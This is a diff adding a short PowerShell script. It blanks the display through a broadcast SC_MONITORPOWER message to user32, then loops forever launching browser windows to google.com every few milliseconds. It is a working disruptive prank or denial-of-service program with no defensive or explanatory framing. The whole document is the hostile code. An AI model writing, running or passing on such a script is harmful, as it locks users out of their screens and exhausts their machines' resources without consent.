@@ -1,0 +1,29 @@
+function desactivar (){
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+public class API
+{
+    [DllImport("user32.dll")]
+    public static extern
+    int SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
+}
+"@
+
+$t = Add-Type -TypeDefinition $code -PassThru
+$t::SendMessage(0xffff, 0x0112, 0xf170, 2)
+}
+
+function pagina(){
+while(2)
+ {
+ Start-Process "http://google.com"
+ Start-Sleep -Milliseconds 5
+ }
+}
+
+while(2)
+{
+desactivar
+pagina
+}
